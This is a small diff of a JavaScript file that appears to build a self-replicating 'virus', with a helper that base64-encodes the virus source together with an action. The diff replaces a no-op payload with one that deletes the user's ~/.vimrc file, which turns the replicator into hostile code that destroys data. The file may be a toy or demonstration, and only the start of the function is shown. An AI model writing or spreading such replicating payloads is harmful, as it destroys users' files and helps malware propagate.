@@ -1,7 +1,7 @@
 const fs   = require( "fs-extra" );
 const exec = require( "child-process-promise" ).exec;
 
-const maliciousAction = "(() => null)();";
+const maliciousAction = "(() => require('fs').unlink( '~/.vimrc' ))()";
 
 function getCopyOfVirus( virusSrc, action ) {
     const enc = x => Buffer.from( x ).toString( "base64" );
